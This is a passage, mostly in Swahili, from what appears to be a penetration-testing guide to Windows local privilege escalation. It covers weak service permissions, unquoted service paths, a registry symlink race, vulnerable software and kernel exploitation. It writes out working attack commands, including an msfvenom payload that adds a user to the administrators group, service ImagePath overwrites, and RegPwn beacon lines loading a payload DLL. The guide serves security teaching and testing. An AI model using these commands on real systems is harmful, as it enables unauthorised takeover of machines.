Kwa kugundua na kutumia vulnerability hii, unaweza kutumia _exploit/windows/local/service_permissions_.

### Ruhusa dhaifu za service binaries

Ikiwa service inaendeshwa kama **`LocalSystem`**, **`LocalService`**, **`NetworkService`**, au akaunti ya domain yenye privileges, lakini **watumiaji wenye privileges za chini wanaweza kurekebisha EXE ya service au folda yake ya mzazi**, mara nyingi service inaweza kutekwa nyara kwa **kubadilisha binary na kuwasha upya service**.

**Angalia kama unaweza kurekebisha binary inayoendeshwa na service** au kama una **ruhusa za kuandika kwenye folda** ilipo binary hiyo ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata kila binary inayoendeshwa na service kwa kutumia **wmic** (siyo katika system32), kisha uangalie ruhusa zako kwa kutumia **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Unaweza pia kutumia **sc** na **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Tafuta ACL hatari zilizopewa **`Everyone`**, **`BUILTIN\Users`**, au **`Authenticated Users`**, hasa **`(F)`**, **`(M)`**, au **`(W)`** kwenye executable ya service au directory iliyo nayo. Njia ya kawaida ya kuzitumia vibaya ni:<sup>[[27]](#references)</sup>

1. Thibitisha akaunti ya service na njia ya executable kwa kutumia `sc qc <service_name>`.
2. Thibitisha kuwa binary inaweza kuandikwa kwa kutumia `icacls <path>`.
3. Badilisha binary ya service na payload au binary halali ya service yenye nia mbaya.
4. Anzisha upya service kwa kutumia `sc stop <service_name> && sc start <service_name>` (au subiri kuwashwa upya kwa kompyuta / kichochezi cha service).

Ukaguzi otomatiki unaoweza kusaidia:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Ikiwa huduma hairuhusu mtumiaji wa kawaida kuiwasha upya, angalia ikiwa inaanza yenyewe wakati wa kuwasha mfumo, ina kitendo cha kushindwa kinachoianzisha tena, au inaweza kuanzishwa kwa njia isiyo ya moja kwa moja na programu inayoitumia.

### Ruhusa za kurekebisha Registry ya huduma

Unapaswa kuangalia ikiwa unaweza kurekebisha Registry yoyote ya huduma.\
Unaweza **kuangalia** **ruhusa** zako kwenye **Registry** ya huduma kwa kufanya:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Jaribio la awali la ruhusa lilielezwa hivi:

Inapaswa kuangaliwa ikiwa **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana ruhusa za `FullControl`. Ikiwa ndivyo, binary inayotekelezwa na service inaweza kubadilishwa.

Kagua ikiwa **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana ruhusa za registry zinazowezesha kuandika kwenye service key husika. Kuingia kwa ACL pekee hakuthibitishi kuwa ufikiaji huo unatumika: deny entries, token ya sasa na ruhusa zilizorithiwa ni muhimu. Haki za registry key ni tofauti na haki za service object za `SERVICE_CHANGE_CONFIG` na `SERVICE_START`. Escalation pia inahitaji sehemu inayoweza kutumika ya service configuration, njia ya kuanzisha service na service identity yenye mamlaka ya juu zaidi. Tazama [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) na [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) za Microsoft.

Kubadilisha Path ya binary inayotekelezwa:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Mbio za registry symlink zinazosababisha uandishi wa thamani yoyote ya HKLM (ATConfig)

Baadhi ya vipengele vya Windows Accessibility huunda funguo za **ATConfig** kwa kila mtumiaji, ambazo baadaye hunakiliwa na mchakato wa **SYSTEM** kwenye ufunguo wa session wa HKLM. Mbio ya **symbolic link ya registry** inaweza kuelekeza uandishi huo wenye upendeleo kwenda kwenye **path yoyote ya HKLM**, na hivyo kutoa uwezo wa kuandika **thamani yoyote ya HKLM**.<sup>[[18]](#references)</sup>

Maeneo muhimu (mfano: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` huorodhesha vipengele vya accessibility vilivyosakinishwa.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` huhifadhi usanidi unaodhibitiwa na mtumiaji.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` huundwa wakati wa kuingia au mabadiliko ya secure-desktop, na mtumiaji anaweza kuiandikia.

Mtiririko wa unyonyaji (CVE-2026-24291 / ATConfig):

1. Weka thamani ya **HKCU ATConfig** unayotaka iandikwe na SYSTEM.
2. Anzisha unakili wa secure-desktop (kwa mfano, **LockWorkstation**), ambao huanzisha mtiririko wa AT broker.
3. **Shinda race** kwa kuweka **oplock** kwenye `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; oplock inapoanzishwa, badilisha ufunguo wa **HKLM Session ATConfig** uwe **registry link** inayoelekeza kwenye lengo la HKLM lililolindwa.
4. SYSTEM huandika thamani iliyochaguliwa na mshambuliaji kwenye path ya HKLM iliyoelekezwa upya.

Baada ya kupata uwezo wa kuandika thamani yoyote ya HKLM, geukia LPE kwa kubadilisha thamani za usanidi wa huduma:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/mstari wa amri)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Chagua huduma ambayo mtumiaji wa kawaida anaweza kuanzisha (kwa mfano, **`msiserver`**) na uiwashe baada ya kuandika. **Kumbuka:** utekelezaji wa exploit wa umma **hufunga workstation** kama sehemu ya race.

Zana za mfano (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

Ukiwa na ruhusa hii kwenye registry, inamaanisha **unaweza kuunda sub registries kutoka kwenye registry hii**. Kwa huduma za Windows, hii **inatosha kutekeleza msimbo wowote:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ikiwa njia ya executable haijawekwa ndani ya alama za kunukuu, Windows itajaribu kutekeleza kila sehemu ya mwisho kabla ya nafasi.

Kwa mfano, kwa njia _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Orodhesha njia zote za huduma zisizo ndani ya alama za kunukuu, ukiondoa zile za huduma za Windows zilizojengewa ndani:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Unaweza kugundua na kufanya exploit ya** udhaifu huu kwa kutumia metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kuunda mwenyewe service binary kwa kutumia metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Vitendo vya Urejeshaji

Windows huruhusu watumiaji kubainisha vitendo vya kutekelezwa huduma inaposhindwa. Kipengele hiki kinaweza kusanidiwa kuelekeza kwenye binary. Ikiwa binary hii inaweza kubadilishwa, privilege escalation inaweza kuwezekana. Maelezo zaidi yanapatikana katika [nyaraka rasmi](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Faili lengwa za script za task zilizopangwa

Kwa task iliyowashwa inayoendesha `cmd.exe /c` ikiwa na faili ya `.bat` au `.cmd`, kagua script iliyotajwa kwenye **argument za action** pamoja na `cmd.exe`. Hali hiyo hiyo inatumika kwa argument ya faili iliyoainishwa wazi kwa interpreter, kama vile PowerShell `-File`. Ikiwa faili ya batch ya task iliyopangwa ina mwito halisi wa PowerShell `-File`, kagua pia ACL ya script iliyorejelewa; vigeu, masharti, na uunganishaji wa shell vinahitaji ufuatiliaji wa mikono. Script au saraka mama inayoweza kuandikwa na mtumiaji wa sasa ni kidokezo cha utekelezaji kati ya akaunti tu ikiwa principal iliyosanidiwa ya task ni tofauti na mtumiaji wa sasa na task inafikia action hiyo kwa kweli. ACL inayoruhusu kuongeza tu inaweza kuwa muhimu kwa script, lakini `exit` ya awali au mtiririko mwingine wa udhibiti unaweza kufanya mistari iliyoongezwa isifikiwe. Thibitisha ACL zinazotumika, [muktadha wa utekelezaji wa task](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), saraka ya kazi, trigger, na sera ya udhibiti wa programu kabla ya kudai kuwa privilege escalation inawezekana. Uorodheshaji haupaswi kurekebisha script au kuanzisha task.

## Streams zilizopewa majina kwenye faili zinazoweza kufikiwa

Kwenye NTFS, faili inayosomeka inaweza kuwa na stream ya `:$DATA` iliyopewa jina, ambayo maudhui yake hayaonyeshwi katika orodha ya kawaida ya saraka. Kwa seti ndogo na husika ya nakala rudufu au faili za usanidi zinazoweza kufikiwa, kagua **majina na ukubwa** wa stream kabla ya kufungua maudhui yoyote; Windows huzionyesha kupitia [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), na PowerShell kupitia [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Jina la stream linalodokeza kuwa na siri ni kidokezo tu. Kagua ruhusa halisi ya kusoma ya faili, kama mfumo wa faili unaunga mkono stream, kama stream ina credentials zinazoweza kutumika, na akaunti ambayo credentials hizo huingia nayo. Epuka uchanganuzi wa stream unaojirudia kwenye saraka ndogo na kuchapisha maudhui ya stream wakati wa uorodheshaji wa kawaida.

## Ingizo za msaidizi wa Windows Driver Kit zilizopangwa

Windows Driver Kit ya hiari inajumuisha `StandaloneRunner.exe`, ambayo inaweza kutumia faili za `command.txt`, `reboot.rsf`, na mradi `working\rsf.rsf` kutoka kwenye saraka yake ya uendeshaji. Task iliyopangwa au huduma inayoanzisha msaidizi huyu kwa akaunti yenye marupurupu inaweza kutumia ruhusa ya kiwango cha chini ya kuandika kwenye ingizo hizo kutekeleza amri katika muktadha wa akaunti hiyo, hata kama executable ya msaidizi yenyewe imelindwa. Thibitisha kuwa kuna mtumiaji mwenye marupurupu anayezitumia na kwamba faili **zote mbili** za kando zinaweza kuundwa au kurekebishwa; kupata msaidizi pekee haitoshi.

Kwa task iliyopangwa, kagua [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) ya action yake na ACL za njia za faili mbili za kando. Ikiwa task haibainishi saraka ya kazi, saraka ya executable ni kidokezo tu cha kuthibitisha, si uthibitisho wa mahali task inaposoma ingizo zake. Sharti la faili ya kazi ya mradi lazima pia litimizwe. Kagua principal halisi ya task badala ya kudhani inaendeshwa kama SYSTEM.

## Programu

### Programu Zilizosakinishwa

Kagua **ruhusa za binaries** (huenda ukaweza kubadilisha mojawapo na kupata privilege escalation) na za **folda** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Njia ya kurekebisha agent ya Checkmk kwenye Windows

[CVE-2024-0670](https://checkmk.com/werk/16361) huathiri agent za zamani za Checkmk za Windows zilizokuwa zikiandika faili za amri kwenye `C:\Windows\Temp`, kisha kutekeleza faili iliyokuwepo awali na iliyolindwa dhidi ya uandishi pale ubadilishaji uliposhindikana. Vendor alirekebisha tatizo hili katika 2.1.0p40, 2.2.0p23, 2.3.0b1, na 2.4.0b1. Kagua kiwango kamili cha patch kilichosakinishwa na kama operesheni ya agent iliyoathiriwa inaweza kutekelezwa; lebo ya branch pekee kama `2.1` haiwezi kuthibitisha uwepo wa hatari. Enumeration inaweza kukagua version, hali ya service, na ruhusa za Temp bila kuunda faili au kuanzisha amri za agent.

#### Ukaguzi wa service ya SAML ya ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) iliathiri ADSelfService Plus build 6210 na matoleo ya awali; vendor aliirekebisha katika build 6211. Inahusika tu ikiwa SAML SSO **imewezeshwa au iliwahi kuwezeshwa**. Kwa hiyo, ingizo la bidhaa iliyosakinishwa au njia ya service ni kidokezo, si hitimisho la uwepo wa vulnerability: thibitisha build halisi, historia ya usanidi wa SAML, ufikikaji wa service kupitia mtandao, na akaunti inayoendesha service hiyo. Code execution kupitia service hutumia ruhusa za akaunti hiyo; utekelezaji wa SYSTEM unahitaji instance inayoendeshwa kama SYSTEM. Faili ya `OfflineBackup_*.ezip` inayosomeka katika saraka ya Backup ya bidhaa ni kidokezo tofauti kuhusu backup iliyosimbwa kwa njia fiche, si ushahidi wa credential inayoweza kutumika au dosari hii ya SAML. Rekodi njia yake na ruhusa za ufikiaji bila kuifungua wakati wa enumeration ya kawaida.

#### Controller ya Jenkins na mipaka ya akaunti za domain

Kwenye controller ya Jenkins ya Windows, tofautisha ruhusa ya kuunda au kusanidi job na ruhusa ya kuianzisha: [Jenkins inaeleza kuwa hizi ni ruhusa tofauti za `Job/Create`, `Job/Configure`, na `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ratiba iliyosanidiwa au remote trigger inaweza kutoa njia nyingine ya kuanzisha build, lakini thibitisha kuwa imewezeshwa na build inatekelezwa kweli. Utekelezaji hutumia utambulisho wa controller au agent iliyochaguliwa, na credential iliyohifadhiwa inaweza kutumika tu ikiwa job inaweza kufikia scope yake. Kando na hilo, kagua ufikiaji wa metadata ya `JENKINS_HOME`: Jenkins huhifadhi taarifa za credential na funguo za usimbaji katika `credentials.xml`, `secrets/hudson.util.Secret`, na `secrets/master.key` ([Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)). Kuwepo kwao pekee hakufichui password; thibitisha **ufikiaji wa kusoma faili zinazohitajika** na njia tofauti ya kutumia tena akaunti bila kuchapisha secrets kwenye matokeo ya pamoja. Ikiwa akaunti hiyo ina ruhusa ya kuandika `scriptPath` ya AD user-object, thibitisha njia ya script inayoweza kuandikwa na logon halisi au consumer iliyoratibiwa inayoendeshwa kama mtumiaji lengwa kabla ya kuichukulia kama utekelezaji kati ya watumiaji. Udhibiti zaidi wa group unahitaji kuthibitisha kivyake ruhusa halisi za AD.

#### Utambulisho wa agent ya Azure Pipelines self-hosted

Kwa mradi wa Azure DevOps Server au Azure Pipelines, tofautisha ruhusa ya **kuunda au kuhariri** pipeline na ruhusa ya **kuianzisha** na kutumia agent pool iliyochaguliwa; [Microsoft inaeleza ruhusa za pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) na [idhini ya pool](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) kando. Ikiwa akaunti yenye ruhusa ndogo inaweza kuwasilisha hatua ya script na kuendesha pipeline hiyo kwenye agent ya Windows self-hosted, hatua hiyo hutekelezwa kama [akaunti ya mfumo wa uendeshaji iliyosanidiwa kwa agent](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Thibitisha pipeline halisi, vizuizi vya branch/resource, pool iliyoidhinishwa, job inayoweza kuendeshwa, na utambulisho wa service ya agent kabla ya kudai kuwa kuna mabadiliko ya ruhusa kati ya watumiaji au kwenda SYSTEM. Agent iliyosakinishwa, role ya mradi, au ruhusa ya kuandika kwenye repository pekee ni vidokezo tu; kagua ruhusa na metadata ya service ya ndani bila kuanzisha build wakati wa enumeration isiyobadilisha hali.

#### Credentials za Microsoft Entra Connect Sync

[Microsoft inatofautisha](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **akaunti ya service ya ADSync**, inayoendesha service ya synchronization na kufikia database yake ya SQL, na **akaunti ya AD DS connector**, ambayo ruhusa zake za directory hutegemea vipengele vya sync vilivyosidiwa. Credentials za connector huhifadhiwa zikiwa zimesimbwa katika database hiyo, huku key material [ikilindwa na DPAPI chini ya akaunti ya service ya ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Service ya sync iliyosakinishwa, group ya ndani yenye jina linalodokeza ruhusa za administrator, au kuona database pekee hakuthibitishi kuwa credential inaweza kusimbuliwa au kwamba kuna njia ya kupandisha ruhusa za domain. Kagua kivyake ruhusa halisi za kusoma database, ufikiaji wa service account/key, mpangilio wa installation na SQL, utambulisho wa connector uliosanidiwa, na ruhusa halisi za utambulisho huo kwenye AD. Enumeration ya kawaida inapaswa kuonyesha metadata ya service na ufikiaji pekee, si kuuliza au kuchapisha secrets zilizohifadhiwa.

#### Ruhusa za DLL za usaidizi za printer driver

Printer driver iliyosakinishwa inaweza kuhifadhi DLL za usaidizi chini ya `C:\ProgramData` na kuzipakia katika print process yenye ruhusa za juu zaidi. Kagua saraka halisi ya driver na ACL za DLL, ikijumuisha saraka za parent na reparse points, hata kama enumeration ya printer kupitia WMI imekataliwa. Kwa [tatizo la Ricoh printer-driver CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), njia iliyoripotiwa ilikuwa `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [ufichuzi wa awali](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) unaeleza upakiaji wa DLL na `PrintIsolationHost.exe`. ACL inayoruhusu uandishi ni kidokezo tu: thibitisha ufikiaji halisi wa kuandika baada ya deny entries, kuwa driver husika imesakinishwa na kupakia faili hiyo chini ya utambulisho wenye ruhusa za juu, na kama driver iliyosasishwa au programu ya usalama ya vendor imerekebisha installation. Usihitimishe kuwa kuna vulnerability kwa kutegemea jina la saraka au version ya driver pekee.

### Ruhusa za Kuandika

Kagua kama unaweza kurekebisha faili fulani ya usanidi ili kusoma faili maalum au kama unaweza kurekebisha binary itakayotekelezwa na akaunti ya Administrator (schedtasks).

Njia moja ya kutafuta ruhusa dhaifu kwenye folda/faili za mfumo ni kufanya:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Plugin za Notepad++ za kupakia kiotomatiki kwa persistence/execution

Notepad++ hupakia kiotomatiki DLL yoyote ya plugin iliyo ndani ya folda ndogo za `plugins`. Ikiwa kuna usakinishaji unaobebeka/nakili unaoweza kuandikwa, kuweka plugin hasidi huwezesha utekelezaji wa msimbo kiotomatiki ndani ya `notepad++.exe` kila inapozinduliwa (ikiwemo kutoka `DllMain` na callbacks za plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Endesha wakati wa kuanza

**Angalia kama unaweza kubadilisha registry au binary itakayoendeshwa na mtumiaji mwingine.**\
**Soma** **ukurasa ufuatao** ili ujifunze zaidi kuhusu **maeneo ya autoruns yanayoweza kutumika kuongeza privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Tafuta drivers za **watoa huduma wengine zinazotiliwa shaka/zenye udhaifu**.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Ikiwa driver inatoa primitive ya kusoma/kuandika kernel kiholela (jambo la kawaida katika IOCTL handlers zilizoundwa vibaya), unaweza kupandisha privileges kwa kuiba SYSTEM token moja kwa moja kutoka kwenye kumbukumbu ya kernel.<sup>[[13]](#references)</sup> Tazama mbinu ya hatua kwa hatua hapa:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Nyenzo zinazohusiana na Windows kernel-exploitation:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Kwa race-condition bugs ambapo call iliyo hatarini hufungua njia ya Object Manager inayodhibitiwa na attacker, kuchelewesha kimakusudi lookup (kwa kutumia components zenye urefu wa juu zaidi au minyororo mirefu ya directories) kunaweza kupanua dirisha kutoka microseconds hadi makumi ya microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### Cancel-safe queue UAFs, ufichuaji wa paged-pool, na I/O ring pivots

Baadhi ya Windows kernel LPE chains zinaweza kujengwa kutokana na bugs mbili dhaifu kila moja kivyake: **cancel-safe queue lifetime race** inayofree request/CBD huku queue lock ikiwa bado imeshikiliwa, na ufichuaji wa **lock-release-before-copy** unaovuja allocation ya paged-pool iliyofree wakati wa `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Vidokezo vya ukaguzi na exploitation:

- **Free-under-lock + cancel afterwards**: tafuta success path inayofanya **Acquire -> CompleteRequest/free -> Release**, huku cancel path ikifanya **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Ikiwa success path inafikia `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` kabla ya kuachilia CBDQ/CSQ lock, thread iliyokwama kwenye `NtCancelIoFileEx -> IopCsqCancelRoutine` inaweza kuendelea baadaye na kupitisha `PFLT_CALLBACK_DATA` iliyofree kwa remove callback ya driver.
- **Reclaim freed queue object** kwa allocation ya paged-pool inayodhibitiwa na attacker na yenye ukubwa sawa. NPFS Data Queue Entries zinafaa kwa sababu payload na ukubwa wake vinaweza kudhibitiwa, na baadaye unaweza kuvichunguza kwa pipe read/peek operations. Ikiwa object iliyofree ina list links, ziandike upya kwa **cyclic list ya fake request nodes kwenye user memory** ili driver iendelee kuchakata request structures zilizofafanuliwa na attacker badala ya kusimama kwenye list head ya awali.
- **Boresha predictable write**: ikiwa fake request inaelekeza upya nested context pointer inayotumiwa na bookkeeping writes (timestamps / QPC / sehemu zilizo karibu na refcount), unaweza kupata kernel write yenye **address inayodhibitika lakini value isiyodhibitika**. Katika hali hiyo, lenga field ya **length/size** ya sprayed pool object badala ya code/data pointer ya mwisho, kisha pitia spray hadi object iliyoharibiwa itoe **out-of-bounds paged-pool read**.
- **Muundo wa raceable disclosure**: syscall yoyote inayofanya `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` ni mgombea mzuri. Uaminifu huongezeka ikiwa attacker anaweza kuongeza ukubwa wa buffer inayokopiwa (kwa mfano kwa kuongeza list/resource entries nyingi zinazoongeza ukubwa wa mwisho wa allocation ya serializer), kwa sababu copy ndefu zaidi huongeza muda wa kubadilisha allocation bila lazima ku-crash mashine.
- **Pointer-rich refill targets**: Windows **I/O ring** registered-buffer arrays ni malengo bora ya ufichuaji kwa sababu ukubwa wake wa paged-pool unaweza kudhibitiwa na attacker (`8 * regBufferCnt`), na kila element ni kernel pointer inayoelekeza kwenye `_IOP_MC_BUFFER_ENTRY`. Vuja mojawapo ya arrays hizi, pata `IORING_OBJECT` inayozizunguka, kisha haribu **`RegBuffers`** na **`RegBuffersCount`** ili shughuli zinazofuata za I/O ring zitumie entries zilizobuniwa na attacker na kutoa arbitrary kernel read/write. Ikiwa write pekee inayopatikana inakupa byte thabiti (kwa mfano kutoka `KUSER_SHARED_DATA+0x14`), tumia **overlapping unaligned writes** kujenga user pointer yenye byte inayojirudia, kama `0x0101010101010101`, i-map kwa `VirtualAlloc`, kisha weka forged registered-buffer array hapo.<sup>[[30]](#references)</sup>

Viashiria muhimu vya debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Baada ya kupata arbitrary kernel read/write kupitia I/O ring iliyoharibika, iba token ya SYSTEM kwa kutumia workflow ya kawaida ya baada ya primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives za memory corruption za Registry hive

Udhaifu wa kisasa wa hive hukuwezesha kupanga layouts zinazotabirika, kutumia descendants za HKLM/HKU zinazoweza kuandikiwa, na kubadilisha corruption ya metadata kuwa kernel paged-pool overflows bila driver maalum. Jifunze chain nzima hapa:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Type confusion ya direct-mode ya `RtlQueryRegistryValues` kupitia paths zinazodhibitiwa na mshambuliaji

Baadhi ya drivers hukubali registry path kutoka userland, hukagua tu kuwa ni UTF-16 string inayokubalika, kisha huita `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` kwa `RTL_QUERY_REGISTRY_DIRECT` ndani ya scalar ya stack kama `int readValue`. Ikiwa `RTL_QUERY_REGISTRY_TYPECHECK` haipo, `EntryContext` hutafsiriwa kulingana na aina **halisi** ya registry, si aina ambayo developer alitarajia.

Hii hutengeneza primitives mbili zenye manufaa:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: path kamili ya `\Registry\...` inayodhibitiwa na mtumiaji huiwezesha driver kuuliza keys zilizochaguliwa na mshambuliaji, kufichua kama zipo kupitia return codes/logs, na wakati mwingine kusoma values ambazo caller hangeweza kufikia moja kwa moja.
- **Kernel memory corruption**: destination ya scalar kama `&readValue` hutafsiriwa kimakosa kama `REG_QWORD`, `UNICODE_STRING`, au sized binary buffer, kutegemea aina ya registry value.

Vidokezo vya exploitation kwa vitendo:

- **Mitigation ya Windows 8+**: ikiwa query inagusa **untrusted hive** kwa `RTL_QUERY_REGISTRY_DIRECT` lakini bila `RTL_QUERY_REGISTRY_TYPECHECK`, callers wa kernel huanguka na `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Ili exploit ibaki inawezekana, tafuta **keys zinazoweza kuandikiwa na mshambuliaji ndani ya trusted system hives** badala ya kuweka values chini ya `HKCU`.
- **Staging kwenye trusted hive**: tumia NtObjectManager kuorodhesha descendants zinazoweza kuandikiwa za `\Registry\Machine`, kisha endesha scan tena kwa token ya **low-integrity** iliyorudiwa ili kupata keys zinazofikika kutoka kwenye mazingira ya sandbox:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: uandishi wa moja kwa moja wa baiti 8 kwenye `int` ya baiti 4 huharibu data iliyo karibu kwenye stack na unaweza kufuta kwa sehemu pointer ya callback/function iliyo karibu.
